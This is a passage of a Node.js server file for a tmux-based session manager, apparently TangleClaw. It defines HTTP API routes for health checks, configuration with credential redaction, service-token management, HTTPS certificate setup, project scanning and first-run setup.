'use strict';

const http = require('node:http');
const https = require('node:https');
const fs = require('node:fs');
const path = require('node:path');
const { createLogger, setLevel, initFileLogging } = require('./lib/logger');
const store = require('./lib/store');
const system = require('./lib/system');
const engines = require('./lib/engines');
const gitHooks = require('./lib/git-hooks');
const gitTemplate = require('./lib/git-template');
const tmux = require('./lib/tmux');
const methodologies = require('./lib/methodologies');
const projects = require('./lib/projects');
const sessions = require('./lib/sessions');
const master = require('./lib/master');
const actions = require('./lib/actions');
const porthub = require('./lib/porthub');
const uploads = require('./lib/uploads');
const continuity = require('./lib/continuity');
const tunnel = require('./lib/tunnel');
const portScanner = require('./lib/port-scanner');
const modelStatus = require('./lib/model-status');
const updateChecker = require('./lib/update-checker');
const updateApplier = require('./lib/update-applier');
const serverInfo = require('./lib/server-info');
const evalAudit = require('./lib/eval-audit');
const pidfile = require('./lib/pidfile');
const sidecar = require('./lib/sidecar');
const openclawVersion = require('./lib/openclaw-version');
const openclawDetect = require('./lib/openclaw-detect');
const tunnelMonitor = require('./lib/tunnel-monitor');
const httpsSetup = require('./lib/https-setup');
const caddy = require('./lib/caddy');
const ttydWatcher = require('./lib/ttyd-watcher');
const wrapSentinel = require('./lib/wrap-sentinel');
const authIdentity = require('./lib/auth-identity');
const serviceToken = require('./lib/service-token');

const log = createLogger('server');

const MAX_BODY_SIZE = 10 * 1024; // 10 KB
const CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.webmanifest': 'application/manifest+json'
};

const PUBLIC_DIR = path.join(__dirname, 'public');

// ── Restart scheduler (overridable in tests) ──
let _scheduleRestart = () => {
  setTimeout(() => {
    log.info('Setup complete — restarting server to apply HTTPS config');
    process.exit(0);
  }, 500);
};

/**
 * Override the restart scheduler (used by tests to prevent process.exit).
 * @param {Function} fn
 */
function _setRestartScheduler(fn) {
  _scheduleRestart = fn;
}

// ── Route Table ──

const routes = [];

/**
 * Register a route handler.
 * @param {string} method - HTTP method
 * @param {string} pattern - URL pattern (supports :param segments)
 * @param {Function} handler - (req, res, params, body) => void
 * @param {object} [options] - Optional route config
 * @param {number} [options.maxBodySize] - Override MAX_BODY_SIZE for this route
 */
function route(method, pattern, handler, options) {
  const paramNames = [];
  const regexStr = pattern.replace(/:([^/]+)/g, (_, name) => {
    paramNames.push(name);
    return '([^/]+)';
  });
  routes.push({
    method: method.toUpperCase(),
    regex: new RegExp(`^${regexStr}$`),
    paramNames,
    handler,
    options: options || {}
  });
}

/**
 * Match a request to a route.
 * @param {string} method - HTTP method
 * @param {string} pathname - URL path
 * @returns {{ handler: Function, params: object, options: object }|null}
 */
function matchRoute(method, pathname) {
  for (const r of routes) {
    if (r.method !== method) continue;
    const match = pathname.match(r.regex);
    if (match) {
      const params = {};
      r.paramNames.forEach((name, i) => {
        params[name] = decodeURIComponent(match[i + 1]);
      });
      return { handler: r.handler, params, options: r.options || {} };
    }
  }
  return null;
}

// ── Response Helpers ──

/**
 * Send a JSON response.
 * @param {http.ServerResponse} res
 * @param {number} status - HTTP status code
 * @param {object} data - Response body
 */
function jsonResponse(res, status, data) {
  const body = JSON.stringify(data);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body)
  });
  res.end(body);
}

/**
 * Send a standard error response.
 * @param {http.ServerResponse} res
 * @param {number} status - HTTP status code
 * @param {string} message - Error message
 * @param {string} code - Machine-readable error code
 */
function errorResponse(res, status, message, code) {
  jsonResponse(res, status, { error: message, code });
}

// ── Body Parser ──

/**
 * Parse JSON request body with size limit.
 * @param {http.IncomingMessage} req
 * @param {number} [maxSize] - Override default max body size
 * @returns {Promise<object|null>}
 */
function parseBody(req, maxSize) {
  const limit = maxSize || MAX_BODY_SIZE;
  return new Promise((resolve, reject) => {
    if (req.method === 'GET' || req.method === 'HEAD') {
      return resolve(null);
    }

    const chunks = [];
    let size = 0;
    let rejected = false;

    req.on('data', (chunk) => {
      size += chunk.length;
      if (size > limit && !rejected) {
        rejected = true;
        // Resume and discard remaining data so the response can be sent
        req.resume();
        reject({ status: 413, message: 'Request body too large', code: 'BODY_TOO_LARGE' });
        return;
      }
      if (!rejected) {
        chunks.push(chunk);
      }
    });

    req.on('end', () => {
      if (size === 0) return resolve(null);
      try {
        const raw = Buffer.concat(chunks).toString('utf8');
        resolve(JSON.parse(raw));
      } catch (err) {
        reject({ status: 400, message: 'Invalid JSON in request body', code: 'BAD_REQUEST' });
      }
    });

    req.on('error', (err) => {
      reject({ status: 500, message: err.message, code: 'INTERNAL_ERROR' });
    });
  });
}

// ── Static File Serving ──

/**
 * Serve a static file from the public directory.
 * @param {http.ServerResponse} res
 * @param {string} pathname - URL path
 * @returns {boolean} - Whether a file was served
 */
function serveStatic(res, pathname) {
  let filePath = path.join(PUBLIC_DIR, pathname);

  // Prevent path traversal
  if (!filePath.startsWith(PUBLIC_DIR)) {
    errorResponse(res, 403, 'Forbidden', 'FORBIDDEN');
    return true;
  }

  // Default to index.html
  if (pathname === '/' || pathname === '') {
    filePath = path.join(PUBLIC_DIR, 'index.html');
  }

  if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
    return false;
  }

  const ext = path.extname(filePath).toLowerCase();
  const contentType = CONTENT_TYPES[ext] || 'application/octet-stream';
  const content = fs.readFileSync(filePath);

  res.writeHead(200, {
    'Content-Type': contentType,
    'Content-Length': content.length,
    'Cache-Control': 'no-cache'
  });
  res.end(content);
  return true;
}

// ── Parse Query String ──

/**
 * Parse URL query parameters.
 * @param {string} search - Query string (e.g. '?key=value')
 * @returns {object}
 */
function parseQuery(search) {
  const params = {};
  if (!search) return params;
  const stripped = search.startsWith('?') ? search.slice(1) : search;
  for (const pair of stripped.split('&')) {
    const [key, ...rest] = pair.split('=');
    if (key) {
      params[decodeURIComponent(key)] = decodeURIComponent(rest.join('=') || '');
    }
  }
  return params;
}

// ── API Route Handlers ──

// GET /api/health
route('GET', '/api/health', (_req, res) => {
  const db = store.getDb();
  let dbStatus = 'unavailable';
  if (db) {
    try {
      db.prepare('SELECT 1').get();
      dbStatus = 'ok';
    } catch {
      dbStatus = 'unavailable';
    }
  }

  // tmux check (synchronous)
  let tmuxStatus = 'unavailable';
  try {
    require('node:child_process').execSync('tmux list-sessions 2>/dev/null', { timeout: 2000 });
    tmuxStatus = 'ok';
  } catch {
    try {
      require('node:child_process').execSync('which tmux', { timeout: 1000 });
      tmuxStatus = 'ok';
    } catch {
      tmuxStatus = 'unavailable';
    }
  }

  // ttyd check — TCP connect to configured port
  const config = store.config.load();
  const net = require('node:net');
  const socket = new net.Socket();
  socket.setTimeout(500);

  return new Promise((resolve) => {
    const respond = (ttyd) => {
      const version = _getVersion();
      const allOk = dbStatus === 'ok' && ttyd === 'ok';
      const status = dbStatus !== 'ok' ? 'degraded' : (allOk ? 'ok' : 'degraded');
      const httpStatus = dbStatus !== 'ok' ? 503 : 200;

      jsonResponse(res, httpStatus, {
        status,
        version,
        uptime: Math.floor(process.uptime()),
        services: {
          database: dbStatus,
          ttyd: ttyd,
          tmux: tmuxStatus
        }
      });
      resolve();
    };

    const ttydTarget = caddy.ttydConnectTarget(config);
    const onTtydUp = () => {
      socket.destroy();
      respond('ok');
    };
    if (ttydTarget.socketPath) {
      socket.connect(ttydTarget.socketPath, onTtydUp);
    } else {
      socket.connect(ttydTarget.port, ttydTarget.host, onTtydUp);
    }
    socket.on('error', () => {
      socket.destroy();
      respond('unavailable');
    });
    socket.on('timeout', () => {
      socket.destroy();
      respond('unavailable');
    });
  });
});

// GET /api/version
route('GET', '/api/version', (_req, res) => {
  jsonResponse(res, 200, { version: _getVersion() });
});

// GET /api/server-info — runtime-vs-disk diff (#199). Browser polls this
// (or fetches on page load) to surface a banner when the running process
// is older than the on-disk code. See `lib/server-info.js` docstring.
route('GET', '/api/server-info', (_req, res) => {
  const info = serverInfo.getServerInfo();
  // AUTH-3: surface the proxy-authenticated user so the dashboard can show
  // "Logged in as <user>". Null unless the Caddy basic_auth gate is live (the
  // trust gate is in lib/auth-identity — a direct-mode header is never honored).
  info.currentUser = authIdentity.resolveRequestUser(_req.headers, store.config.load());
  jsonResponse(res, 200, info);
});

// ── Project Master (chunk G, #331) ──
// Operator routes for the global read-only assistant — a reserved tmux
// session, NOT a sessions-table row (see lib/master.js). Deliberately outside
// the M2M-gated path set: these are operator surfaces, not fleet surfaces.

// GET /api/master/status — is the master session alive? Truth from tmux.
route('GET', '/api/master/status', (_req, res) => {
  jsonResponse(res, 200, master.getMasterStatus());
});

// POST /api/master/ensure — idempotent create-or-noop. Regenerates the
// master's CLAUDE.md identity every call (so guide/token changes propagate),
// launches the session only when absent. The UI calls this before attaching
// the terminal iframe (ttyd only attaches to EXISTING tmux sessions).
route('POST', '/api/master/ensure', (_req, res) => {
  const result = master.ensureMasterSession();
  if (result.error) {
    return errorResponse(res, 500, result.error, 'MASTER_ENSURE_FAILED');
  }
  jsonResponse(res, 200, result);
});

// POST /api/server/restart — kick the TC server via the platform's
// process manager (#235). 202 Accepted is sent BEFORE the exec so the
// browser sees a clean response, then ~80ms later the launchctl
// kickstart kills this process. The browser polls /api/server-info to
// detect when the new process is up and reloads. Returns 501 when no
// restart mechanism is available (e.g. bare-node, Linux today) so the
// frontend can hide the button cleanly.
route('POST', '/api/server/restart', (_req, res) => {
  const mechanism = serverInfo.detectRestartMechanism();
  if (!mechanism) {
    jsonResponse(res, 501, {
      ok: false,
      error: 'no restart mechanism available on this host (macOS launchd plist not detected; Linux support is a follow-up)'
    });
    return;
  }
  const command = serverInfo.buildRestartCommand(mechanism);
  if (!command) {
    // Defensive: detectRestartMechanism returned non-null but
    // buildRestartCommand didn't recognize it. Bug, not user error.
    jsonResponse(res, 500, {
      ok: false,
      error: `internal: no command builder for mechanism "${mechanism}"`
    });
    return;
  }
  jsonResponse(res, 202, {
    ok: true,
    mechanism,
    detail: 'restart scheduled; poll /api/server-info to detect when the new process is up'
  });
  // Delay so the response actually drains through the network before
  // `launchctl kickstart -k` SIGKILLs us. SIGKILL closes sockets with
  // RST (not FIN) on macOS, so any bytes still in the kernel TX buffer
  // are dropped without delivery. On localhost the handover is
  // sub-millisecond; on a Cloudflare tunnel to a remote browser
  // (per the `reference_remote_setup` access path: elkaholic → cursatory)
  // RTT can be 50-150ms, so the 202 response needs a margin past the
  // pure kernel-flush time. 300ms covers typical tunnel RTT plus
  // queue/processing slack without being noticeably slow to the
  // operator (the dialog closes, then ~300ms later polling begins —
  // visually instantaneous). Bumped from 80ms after Critic-flagged
  // remote-truncation risk on #235.
  setTimeout(() => {
    try {
      require('node:child_process').execSync(command, { stdio: ['ignore', 'ignore', 'ignore'], timeout: 5000 });
    } catch (err) {
      // We're about to be killed anyway; log for the next process to
      // notice on tail, but don't crash before SIGKILL arrives.
      // eslint-disable-next-line no-console
      console.error('[server-restart] exec failed:', err && err.message);
    }
  }, 300);
});

// GET /api/config
/**
 * Strip credential material from a config object before it leaves the server.
 * `deletePassword` (scrypt) and `basicAuthHash` (bcrypt) are stored hashes, and
 * `serviceToken` (AUTH-4) is a raw bearer secret — none of them need to reach a
 * client (the hashes are offline-cracking targets; the token is a live
 * credential), the UI only needs to know whether each is set. Returns a shallow
 * copy with each secret removed and a `*Protected`/`*Configured` boolean in its
 * place.
 * @param {object} config
 * @returns {object}
 */
function redactConfigSecrets(config) {
  const redacted = { ...config };
  redacted.deleteProtected = !!redacted.deletePassword;
  delete redacted.deletePassword;
  redacted.basicAuthConfigured = !!redacted.basicAuthHash;
  delete redacted.basicAuthHash;
  // AUTH-4 — the raw fleet token never leaves via the config API; surface only
  // whether one is set. It is revealed through the dedicated reveal endpoint.
  redacted.serviceTokenConfigured = !!redacted.serviceToken;
  delete redacted.serviceToken;
  return redacted;
}

route('GET', '/api/config', (_req, res) => {
  const config = store.config.load();
  jsonResponse(res, 200, redactConfigSecrets(config));
});

// PATCH /api/config
route('PATCH', '/api/config', async (_req, res, _params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }

  const config = store.config.load();
  // Snapshot of pre-mutation values for fields whose downstream effects
  // are conditional on whether the value actually changed (#247 hardening
  // — saveGlobalSettings POSTs the field on every Save click, so unrelated
  // UI saves were triggering an N-project filesystem walk).
  const oldStripAiCoauthors = config.stripAiCoauthors;
  const allowedFields = [
    'serverPort', 'ttydPort', 'defaultEngine', 'defaultMethodology',
    'projectsDir', 'deletePassword', 'quickCommands', 'theme',
    'chimeEnabled', 'chimeMuted', 'peekMode', 'setupComplete',
    'portScannerEnabled', 'portScannerIntervalMs',
    'httpsEnabled', 'httpsCertPath', 'httpsKeyPath',
    'stripAiCoauthors', 'ingressMode', 'publicDomain',
    'caddyHttpsPort', 'caddyHttpPort',
    'authEnabled', 'basicAuthUser', 'basicAuthHash',
    'serviceTokenEnabled'
  ];

  const validThemes = ['dark', 'light', 'high-contrast'];
  const validPeekModes = ['drawer', 'modal', 'alert'];
  const validIngressModes = ['direct', 'caddy'];

  let requiresRestart = false;

  for (const [key, value] of Object.entries(body)) {
    if (!allowedFields.includes(key)) continue;

    // Validate specific fields
    if ((key === 'serverPort' || key === 'ttydPort') && typeof value !== 'number') {
      return errorResponse(res, 400, `${key} must be a number`, 'BAD_REQUEST');
    }
    if (key === 'theme' && !validThemes.includes(value)) {
      return errorResponse(res, 400, `theme must be one of: ${validThemes.join(', ')}`, 'BAD_REQUEST');
    }
    if (key === 'peekMode' && !validPeekModes.includes(value)) {
      return errorResponse(res, 400, `peekMode must be one of: ${validPeekModes.join(', ')}`, 'BAD_REQUEST');
    }
    if (key === 'setupComplete' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'setupComplete must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'chimeMuted' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'chimeMuted must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'portScannerEnabled' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'portScannerEnabled must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'portScannerIntervalMs') {
      if (typeof value !== 'number' || value < 10000 || value > 600000) {
        return errorResponse(res, 400, 'portScannerIntervalMs must be a number between 10000 and 600000', 'BAD_REQUEST');
      }
    }

    if (key === 'httpsEnabled' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'httpsEnabled must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'ingressMode' && !validIngressModes.includes(value)) {
      return errorResponse(res, 400, `ingressMode must be one of: ${validIngressModes.join(', ')}`, 'BAD_REQUEST');
    }
    if (key === 'publicDomain' && value !== null && typeof value !== 'string') {
      return errorResponse(res, 400, 'publicDomain must be a string or null', 'BAD_REQUEST');
    }
    if ((key === 'caddyHttpsPort' || key === 'caddyHttpPort')) {
      if (typeof value !== 'number' || !Number.isInteger(value) || value < 1 || value > 65535) {
        return errorResponse(res, 400, `${key} must be an integer between 1 and 65535`, 'BAD_REQUEST');
      }
    }
    if (key === 'stripAiCoauthors' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'stripAiCoauthors must be a boolean', 'BAD_REQUEST');
    }
    if ((key === 'httpsCertPath' || key === 'httpsKeyPath') && value !== null && typeof value !== 'string') {
      return errorResponse(res, 400, `${key} must be a string or null`, 'BAD_REQUEST');
    }
    // AUTH-2 — basic_auth gate config.
    if (key === 'authEnabled' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'authEnabled must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'basicAuthUser' && value !== null && value !== '' && typeof value !== 'string') {
      return errorResponse(res, 400, 'basicAuthUser must be a string or null', 'BAD_REQUEST');
    }
    // AUTH-4 — M2M service-token gate master switch. The raw `serviceToken` is
    // NOT patchable here (managed via the rotate endpoint + auto-generation);
    // only the enable flag is operator-settable.
    if (key === 'serviceTokenEnabled' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'serviceTokenEnabled must be a boolean', 'BAD_REQUEST');
    }
    if (key === 'basicAuthHash' && value !== null && value !== '') {
      // Must be a bcrypt hash, never a plaintext password — `caddy hash-password`
      // produces `$2a$NN$…` (60 chars). Rejecting non-bcrypt input is the guard
      // against a plaintext password being stored where a hash is expected.
      if (typeof value !== 'string' || !caddy.BCRYPT_HASH_RE.test(value)) {
        return errorResponse(res, 400, 'basicAuthHash must be a bcrypt hash (use `caddy hash-password`), not a plaintext password', 'BAD_REQUEST');
      }
    }

    // Normalize empty-string cert paths to null so persisted shape matches /api/setup/complete
    let storedValue = value;
    if ((key === 'httpsCertPath' || key === 'httpsKeyPath' || key === 'publicDomain'
         || key === 'basicAuthUser' || key === 'basicAuthHash') && (value === '' || value === null)) {
      storedValue = null;
    }

    if (key === 'serverPort' || key === 'ttydPort' || key === 'httpsEnabled' || key === 'httpsCertPath' || key === 'httpsKeyPath' || key === 'ingressMode') {
      if (config[key] !== storedValue) requiresRestart = true;
    }

    // Hash deletePassword before persisting
    if (key === 'deletePassword' && storedValue !== null) {
      config[key] = projects.hashPassword(storedValue);
    } else {
      config[key] = storedValue;
    }
  }

  // Validate HTTPS cert pair when HTTPS is enabled (mirrors /api/setup/complete).
  // Allow httpsEnabled=true with no cert paths — createServer() will log and fall
  // back to HTTP gracefully so existing installs don't break on upgrade.
  if (config.httpsEnabled && config.httpsCertPath && config.httpsKeyPath) {
    const validation = httpsSetup.validateCertFiles(config.httpsCertPath, config.httpsKeyPath);
    if (!validation.ok) {
      return errorResponse(res, 400, `HTTPS cert validation failed: ${validation.error}`, 'BAD_REQUEST');
    }
  } else if (config.httpsEnabled && (config.httpsCertPath || config.httpsKeyPath)) {
    return errorResponse(res, 400, 'Both httpsCertPath and httpsKeyPath are required when HTTPS is enabled with cert paths', 'BAD_REQUEST');
  }

  // AUTH-2 fail-closed gate: enabling basic_auth requires BOTH a user and a hash.
  // Mirrors buildCaddyfileContent's both-or-neither guard so the config can never
  // hold authEnabled=true with a missing credential — which would otherwise make
  // the next cutover throw (or, if the guard were absent, emit an UNGATED ingress
  // on a reachable box). Symmetric with the generator's predicate by design.
  if (config.authEnabled && (!config.basicAuthUser || !config.basicAuthHash)) {
    return errorResponse(res, 400, 'authEnabled requires both basicAuthUser and basicAuthHash', 'BAD_REQUEST');
  }

  // AUTH-4 — enabling the M2M gate auto-generates a fleet token on first enable,
  // so the config can never hold serviceTokenEnabled=true with a null token (the
  // fail-closed state the gate would otherwise 500 on). The invariant lives in
  // one place (service-token.ensureTokenWhenEnabled) shared with the rotate
  // endpoint — see [[feedback_symmetric_capability_gates]]. The token is retained
  // (inert) on disable so re-enabling is stable. Logged without the secret.
  if (serviceToken.ensureTokenWhenEnabled(config)) {
    log.info('AUTH-4 service token auto-generated on enable');
  }

  // AUTH-2 — the wizard's "Skip" closes setup via PATCH { setupComplete: true }.
  // In caddy mode that path must honor the SAME forced-admin gate as
  // /api/setup/complete, or Skip would slip past the login gate. Only the explicit
  // complete-setup transition is guarded (body.setupComplete === true) so unrelated
  // PATCHes in caddy mode aren't blocked.
  if (body.setupComplete === true && config.ingressMode === 'caddy'
      && !(config.authEnabled && config.basicAuthUser && config.basicAuthHash)) {
    return errorResponse(res, 400,
      'Cannot finish setup behind the Caddy ingress without an admin credential (basic_auth login gate).',
      'ADMIN_REQUIRED');
  }

  store.config.save(config);

  // Restart or stop port scanner if settings changed
  if ('portScannerEnabled' in body || 'portScannerIntervalMs' in body) {
    portScanner.stopScanner();
    if (config.portScannerEnabled) {
      portScanner.startScanner(config.portScannerIntervalMs);
    }
  }

  // #247 — toggling stripAiCoauthors re-syncs the commit-msg hook across
  // EVERY registered project (including archived ones — Critic flagged
  // that filtering on `{archived: false}` would leave orphan hooks on
  // archived projects after a toggle-OFF). Symmetric with the install
  // path: turn ON → install everywhere a `.git/` exists; turn OFF →
  // uninstall everywhere (drift-aware — foreign hooks are preserved by
  // syncGitHooks). Gated on actual value change so a Save click that
  // didn't touch this toggle doesn't trigger an N-project filesystem
  // walk (#247 hardening).
  if ('stripAiCoauthors' in body && body.stripAiCoauthors !== oldStripAiCoauthors) {
    const all = store.projects.list(); // no archived filter — see above
    for (const project of all) {
      if (!project.path) continue;
      try {
        gitHooks.syncGitHooks(project.path, config);
      } catch (err) {
        log.warn('Failed to sync git hooks after stripAiCoauthors toggle', {
          project: project.name, error: err.message
        });
      }
    }
    // #252 — also flip the global git template so non-TC-managed repos
    // pick the hook up on next `git init` / `git clone`. Independent of
    // the per-project walk above: the template covers FUTURE repos
    // anywhere on the host; the per-project loop covers EXISTING
    // TC-managed repos. Both must run on every toggle.
    try {
      gitTemplate.syncGlobalTemplate(config);
    } catch (err) {
      log.warn('Failed to sync global git template after stripAiCoauthors toggle', {
        error: err.message
      });
    }
  }

  // Build redacted response — strip credential hashes (deletePassword, basicAuthHash).
  const redacted = redactConfigSecrets(config);

  jsonResponse(res, 200, { ok: true, config: redacted, requiresRestart });
});

// AUTH-4b — service-token management. These are OPERATOR endpoints (gated by
// basic_auth in caddy mode / localhost-only in direct mode, like the rest of
// /api), deliberately OUTSIDE the M2M-gated path set — a service caller holding
// the token must not be able to reveal or rotate its own gate credential.

// GET /api/service-token — reveal the raw fleet token for the Settings
// "reveal" display. 404 when the gate is off or no token is set (nothing to
// reveal); the redacted config API never carries the raw value.
route('GET', '/api/service-token', (_req, res) => {
  const config = store.config.load();
  if (!config.serviceTokenEnabled || !config.serviceToken) {
    return errorResponse(res, 404, 'No service token is configured', 'NO_SERVICE_TOKEN');
  }
  jsonResponse(res, 200, { token: config.serviceToken });
});

// POST /api/service-token/rotate — generate + persist a NEW fleet token and
// return it. Only meaningful while the gate is active, so guard on enabled
// (mirrors reveal). Re-injected into every project at the next session launch;
// live sessions holding the old token break until relaunch — documented.
route('POST', '/api/service-token/rotate', (_req, res) => {
  const config = store.config.load();
  if (!config.serviceTokenEnabled) {
    return errorResponse(res, 409, 'Enable the service token gate before rotating', 'SERVICE_TOKEN_DISABLED');
  }
  config.serviceToken = serviceToken.generateToken();
  store.config.save(config);
  log.info('AUTH-4 service token rotated');
  jsonResponse(res, 200, { token: config.serviceToken });
});

// GET /api/setup/https-check — Detect mkcert availability for the wizard
route('GET', '/api/setup/https-check', (_req, res) => {
  const detection = httpsSetup.detectMkcert();
  const caInstalled = detection.available ? httpsSetup.isCaInstalled(detection.carootPath) : false;
  jsonResponse(res, 200, {
    mkcert: {
      available: detection.available,
      version: detection.version,
      carootPath: detection.carootPath,
      caInstalled,
      error: detection.error
    },
    certsDir: httpsSetup.getCertsDir()
  });
});

// POST /api/setup/generate-cert — Run mkcert to produce cert.pem + key.pem
// Valid host: letters/digits/dots/colons/hyphens, not starting with '-' so mkcert
// can't mistake it for a flag. Max length 253 per RFC 1035 (plus IPv6 colons).
const HOST_RE = /^[A-Za-z0-9]([A-Za-z0-9.\-:]{0,252})$/;
route('POST', '/api/setup/generate-cert', (_req, res, _params, body) => {
  let hosts;
  if (body && body.hosts !== undefined) {
    if (!Array.isArray(body.hosts) || body.hosts.length === 0) {
      return errorResponse(res, 400, 'hosts must be a non-empty array of strings', 'BAD_REQUEST');
    }
    for (const h of body.hosts) {
      if (typeof h !== 'string' || !HOST_RE.test(h)) {
        return errorResponse(res, 400, `Invalid host: ${JSON.stringify(h)}`, 'BAD_REQUEST');
      }
    }
    hosts = body.hosts;
  }

  let result;
  try {
    result = httpsSetup.generateCerts(hosts ? { hosts } : undefined);
  } catch (err) {
    return errorResponse(res, 500, err.message, 'MKCERT_FAILED');
  }

  jsonResponse(res, 200, {
    ok: true,
    certPath: result.certPath,
    keyPath: result.keyPath,
    hosts: result.hosts,
    expiry: result.expiry,
    remoteTrust: httpsSetup.getRemoteTrustInstructions(result.carootPath)
  });
});

// POST /api/setup/scan — Scan a directory for existing projects
route('POST', '/api/setup/scan', (_req, res, _params, body) => {
  if (!body || typeof body.directory !== 'string') {
    return errorResponse(res, 400, 'directory is required', 'BAD_REQUEST');
  }

  const dir = projects.resolveProjectsDir(body.directory);

  if (!fs.existsSync(dir)) {
    return errorResponse(res, 400, `Directory does not exist: ${body.directory}`, 'BAD_REQUEST');
  }

  let stat;
  try {
    stat = fs.statSync(dir);
  } catch (err) {
    return errorResponse(res, 400, `Cannot access directory: ${err.message}`, 'BAD_REQUEST');
  }
  if (!stat.isDirectory()) {
    return errorResponse(res, 400, `Path is not a directory: ${body.directory}`, 'BAD_REQUEST');
  }

  // Scan for projects in the specified directory
  const detected = [];
  let entries;
  try {
    entries = fs.readdirSync(dir, { withFileTypes: true });
  } catch (err) {
    return errorResponse(res, 400, `Failed to read directory: ${err.message}`, 'BAD_REQUEST');
  }

  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    if (entry.name.startsWith('.')) continue;

    const dirPath = path.join(dir, entry.name);

    // Detect methodology
    const detectedMethodology = methodologies.detect(dirPath);

    // Check for git
    let gitInfo = null;
    try {
      const git = require('./lib/git');
      gitInfo = git.getInfo(dirPath);
    } catch {
      // Not a git repo or git not available
    }

    // Check for TangleClaw config
    const hasTangleclawConfig = fs.existsSync(path.join(dirPath, '.tangleclaw', 'project.json'));

    // Check for common project manifest files
    const PROJECT_MARKERS = [
      'package.json', 'Cargo.toml', 'pyproject.toml', 'go.mod',
      'Makefile', 'Gemfile', 'pom.xml', 'build.gradle',
      'CMakeLists.txt', 'setup.py', 'composer.json', 'mix.exs'
    ];
    const hasProjectMarker = PROJECT_MARKERS.some(m => fs.existsSync(path.join(dirPath, m)));

    const isDetected = !!(detectedMethodology || (gitInfo && gitInfo.branch) || hasTangleclawConfig || hasProjectMarker);

    detected.push({
      name: entry.name,
      path: dirPath,
      methodology: detectedMethodology ? detectedMethodology.id : null,
      hasTangleclawConfig,
      git: gitInfo ? { branch: gitInfo.branch, dirty: gitInfo.dirty } : null,
      detected: isDetected
    });
  }

  jsonResponse(res, 200, { projects: detected });
});

// POST /api/setup/complete — Batch setup: update config + attach projects
route('POST', '/api/setup/complete', (req, res, _params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }

  const config = store.config.load();
  const warnings = [];

  // Snapshot HTTPS state before mutations so we can decide whether to restart
  const prevHttps = {
    enabled: !!config.httpsEnabled,
    certPath: config.httpsCertPath || null,
    keyPath: config.httpsKeyPath || null
  };

  // Update config fields
  if (body.projectsDir && typeof body.projectsDir === 'string') {
    config.projectsDir = body.projectsDir;
  }
  if (body.defaultEngine && typeof body.defaultEngine === 'string') {
    config.defaultEngine = body.defaultEngine;
  }
  if (body.defaultMethodology && typeof body.defaultMethodology === 'string') {
    config.defaultMethodology = body.defaultMethodology;
  }
  if (body.deletePassword !== undefined) {
    if (body.deletePassword && typeof body.deletePassword === 'string') {
      config.deletePassword = projects.hashPassword(body.deletePassword);
    } else {
      config.deletePassword = null;
    }
  }
  if (typeof body.chimeEnabled === 'boolean') {
    config.chimeEnabled = body.chimeEnabled;
  }

  // HTTPS fields
  if (typeof body.httpsEnabled === 'boolean') {
    config.httpsEnabled = body.httpsEnabled;
  }
  if (body.httpsCertPath === null || typeof body.httpsCertPath === 'string') {
    config.httpsCertPath = body.httpsCertPath || null;
  }
  if (body.httpsKeyPath === null || typeof body.httpsKeyPath === 'string') {
    config.httpsKeyPath = body.httpsKeyPath || null;
  }

  if (config.httpsEnabled && config.httpsCertPath && config.httpsKeyPath) {
    const validation = httpsSetup.validateCertFiles(config.httpsCertPath, config.httpsKeyPath);
    if (!validation.ok) {
      return errorResponse(res, 400, `HTTPS cert validation failed: ${validation.error}`, 'BAD_REQUEST');
    }
  } else if (config.httpsEnabled && (config.httpsCertPath || config.httpsKeyPath)) {
    return errorResponse(res, 400, 'Both httpsCertPath and httpsKeyPath are required when HTTPS is enabled with cert paths', 'BAD_REQUEST');
  }

  // AUTH-2 — forced first-run admin in caddy ingress mode. The login gate lives at
  // Caddy (basic_auth), so completing setup behind Caddy with NO credential would
  // leave the box reachable AND unauthenticated. Require an admin: either supplied
  // now (adminUser + adminPassword, hashed here via `caddy hash-password`) or
  // already configured. The wizard only sends these in caddy mode, but the gate is
  // enforced server-side so it can't be bypassed.
  const inCaddyMode = config.ingressMode === 'caddy';
  const adminProvided = body.adminUser !== undefined || body.adminPassword !== undefined;
  if (adminProvided) {
    const adminUser = typeof body.adminUser === 'string' ? body.adminUser.trim() : '';
    const adminPassword = typeof body.adminPassword === 'string' ? body.adminPassword : '';
    if (!adminUser) {
      return errorResponse(res, 400, 'adminUser is required to set an admin credential', 'BAD_REQUEST');
    }
    const pwCheck = caddy.validateAdminPassword(adminPassword, adminUser);
    if (!pwCheck.ok) {
      return errorResponse(res, 400, pwCheck.error, 'BAD_REQUEST');
    }
    let hash;
    try {
      hash = caddy.hashPassword(adminPassword);
    } catch (err) {
      // Never log the plaintext; the message is the caddy failure, not the secret.
      log.error('Admin credential hashing failed during setup', { error: err.message });
      return errorResponse(res, 500, `Could not hash admin password: ${err.message}`, 'HASH_FAILED');
    }
    // Persist the credential. The live Caddyfile gate is (re)applied by the ingress
    // cutover, which reads authEnabled — so a warning is surfaced below when the
    // running ingress isn't yet gated.
    config.authEnabled = true;
    config.basicAuthUser = adminUser;
    config.basicAuthHash = hash;
    log.info('Admin credential set during setup (basic_auth gate)', { user: adminUser, ingressMode: config.ingressMode });
  }

  const adminConfigured = !!(config.authEnabled && config.basicAuthUser && config.basicAuthHash);
  if (inCaddyMode && !adminConfigured) {
    return errorResponse(res, 400,
